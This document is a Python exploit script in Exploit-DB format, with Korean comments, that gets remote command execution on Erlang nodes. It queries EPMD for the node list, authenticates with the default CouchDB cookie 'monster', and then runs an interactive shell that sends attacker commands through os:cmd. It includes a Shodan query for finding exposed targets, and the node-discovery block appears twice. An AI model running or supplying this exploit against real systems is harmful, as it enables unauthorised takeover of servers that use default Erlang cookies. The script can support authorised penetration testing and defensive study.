# Exploit Title: Remote Command Execution via Erlang Distribution Protocol 
# Date: 2022-01-21
# Exploit Author: Konstantin Burov, @_sadshade
# Software Link: https://www.erlang.org/doc/apps/erts/erl_dist_protocol.html
# Version: N/A
# Tested on: Kali 2021.2
# Based on 1F98D's Erlang Cookie - Remote Code Execution
# Shodan: port:4369 "name "
# References:
#  https://www.exploit-db.com/exploits/49418
#  https://insinuator.net/2017/10/erlang-distribution-rce-and-a-cookie-bruteforcer/
#  https://book.hacktricks.xyz/pentesting/4369-pentesting-erlang-port-mapper-daemon-epmd#erlang-cookie-rce
# 
#
#!/usr/local/bin/python3

import socket
from hashlib import md5
import struct
import sys
import re
import time

# 대상 시스템 및 포트 설정
TARGET = sys.argv[1]
EPMD_PORT = int(sys.argv[2])  # 기본 Erlang 분산 포트
COOKIE = "monster"  # CouchDB에 대한 기본 Erlang 쿠키
ERLNAG_PORT = 0
EPM_NAME_CMD = b"\x00\x01\x6e"  # 노드 목록 요청

# 일부 데이터
NAME_MSG = b"\x00\x15n\x00\x05\x00\x07\x49\x9cAAAAAA@AAAAAAA"
CHALLENGE_REPLY = b"\x00\x15r\x01\x02\x03\x04"
CTRL_DATA = b"\x83h\x04a\x06gw\x0eAAAAAA@AAAAAAA\x00\x00\x00\x03"
CTRL_DATA += b"\x00\x00\x00\x00\x00w\x00w\x03rex"

def compile_cmd(CMD):
    MSG = b"\x83h\x02gw\x0eAAAAAA@AAAAAAA\x00\x00\x00\x03\x00\x00\x00"
    MSG += b"\x00\x00h\x05w\x04callw\x02osw\x03cmdl\x00\x00\x00\x01k"
    MSG += struct.pack(">H", len(CMD))
    MSG += bytes(CMD, 'ascii')
    MSG += b'jw\x04user'
    PAYLOAD = b'\x70' + CTRL_DATA + MSG
    PAYLOAD = struct.pack('!I', len(PAYLOAD)) + PAYLOAD
    return PAYLOAD

# ...

# 주석 추가 부분

# Connect to EPMD: EPMD에 연결합니다.
try:
    epm_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    epm_socket.connect((TARGET, EPMD_PORT))
except socket.error as msg:
    print("EPMD에 연결할 수 없습니다: %s\n 프로그램 종료" % msg)
    sys.exit(1)

epm_socket.send(EPM_NAME_CMD)  # Erlang 노드 목록 요청
if epm_socket.recv(4) == b'\x00\x00\x11\x11':  # OK
    data = epm_socket.recv(1024)
    data = data[0:len(data) - 1].decode('ascii')
    data = data.split("\n")
    if len(data) == 1:
        choise = 1
        print("찾은 노드: " + data[0])
    else:
        print("\n하나 이상의 노드가 발견되었습니다. 사용할 노드를 선택하세요:")
        line_number = 0
        for line in data:
            line_number += 1
            print(" %d) %s" % (line_number, line))
        choise = int(input("\n> "))

    ERLNAG_PORT = int(re.search("\d+$", data[choise - 1])[0])
else:
    print("노드 목록 요청 오류, 종료")
    sys.exit(1)
epm_socket.close()

# Connect to EPMD: EPMD에 연결합니다.
try:
    epm_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    epm_socket.connect((TARGET, EPMD_PORT))
except socket.error as msg:
    print("EPMD에 연결할 수 없습니다: %s\n 프로그램 종료" % msg)
    sys.exit(1)
    
epm_socket.send(EPM_NAME_CMD)  # Erlang 노드 목록 요청
if epm_socket.recv(4) == b'\x00\x00\x11\x11':  # OK
    data = epm_socket.recv(1024)
    data = data[0:len(data) - 1].decode('ascii')
    data = data.split("\n")
    if len(data) == 1:
        choise = 1
        print("찾은 " + data[0])
    else:
        print("\n하나 이상의 노드가 발견되었습니다. 사용할 노드를 선택하세요:")
        line_number = 0
        for line in data:
            line_number += 1
            print(" %d) %s" % (line_number, line))
        choise = int(input("\n> "))
        
    ERLNAG_PORT = int(re.search("\d+$",data[choise - 1])[0])
else:
    print("노드 목록 요청 오류, 종료")
    sys.exit(1)
epm_socket.close()

# Connect to Erlang port: Erlang 포트에 연결합니다.
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((TARGET, ERLNAG_PORT))
except socket.error as msg:
    print("Erlang 서버에 연결할 수 없습니다: %s\n 프로그램 종료" % msg)
    sys.exit(1)
   
s.send(NAME_MSG)
s.recv(5)
challenge = s.recv(1024)     # "challenge" 메시지 수신
print(challenge)
challenge = struct.unpack(">I", challenge[9:13])[0]

# 챌린지 추출
# print("추출된 챌린지: {}".format(challenge))

# 챌린지 응답 추가
CHALLENGE_REPLY += md5(bytes(COOKIE, "ascii")
    + bytes(str(challenge), "ascii")).digest()
s.send(CHALLENGE_REPLY)
CHALLENGE_RESPONSE = s.recv(1024)

if len(CHALLENGE_RESPONSE) == 0:
    print("인증 실패, 종료")
    sys.exit(1)

print("인증 성공")
print("명령을 입력하세요:\n")

data_size = 0
while True:
    if data_size <= 0:
        CMD = input("> ")
        if not CMD:
            continue
        elif CMD == "exit":
            sys.exit(0)
        s.send(compile_cmd(CMD))
        data_size = struct.unpack(">I", s.recv(4))[0]  # 데이터 크기 가져오기
        s.recv(45)              # 제어 메시지
        data_size -= 45         # 제어 메시지를 제외한 데이터 크기
        time.sleep(0.1)
    elif data_size < 1024:
        data = s.recv(data_size)
        # print("S---data_size: %d, data_recv_size: %d" %(data_size,len(data)))
        time.sleep(0.1)
        print(data[3:].decode())
        data_size = 0
    else:
        data = s.recv(1024)
        # print("L---data_size: %d, data_recv_size: %d" %(data_size,len(data)))
        time.sleep(0.1)
        print(data[4:].decode())
        data_size -= 1024
